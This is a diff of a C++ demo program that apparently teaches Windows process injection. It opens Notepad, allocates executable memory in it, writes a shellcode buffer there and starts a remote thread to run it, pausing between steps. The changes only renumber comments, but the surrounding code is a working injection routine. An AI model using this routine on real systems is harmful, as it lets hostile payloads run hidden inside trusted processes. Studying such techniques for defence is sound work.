@@ -46,7 +46,7 @@ unsigned char shellcode[] = {
 int main()
 {
     
-    // - SECTION 1: Start the victim process
+    // - Start the victim process
     printf("%s To start, we will open Notepad\n", k);
     system("pause");
     STARTUPINFO si = { sizeof(si) };
@@ -73,7 +73,7 @@ int main()
     // Sleep for one second to allow Notepad to open
     std::this_thread::sleep_for(std::chrono::milliseconds(1000));
 
-    // - SECTION 2: Allocate memory space
+    // - SECTION 1: Allocate memory space
     printf("%s Now, we will allocate the memory for our injection\n", k);
     system("pause");
     rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
@@ -82,11 +82,11 @@ int main()
     printf("%s Now we will write the shellcode into the allocated memory\n", k);
     system("pause");
 
-    // - SECTION 3: Write Memory space
+    // - SECTION 2: Write Memory space
     WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), NULL);
     printf("%s wrote %zu-bytes to process memory\n", k, sizeof(shellcode));
 
-    // - SECTION 4: Create thread to run our payload
+    // - SECTION 3: Create thread to run our payload
     printf("%s Now we will create the thread that will execute our shellcode\n", k);
     system("pause");
     hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
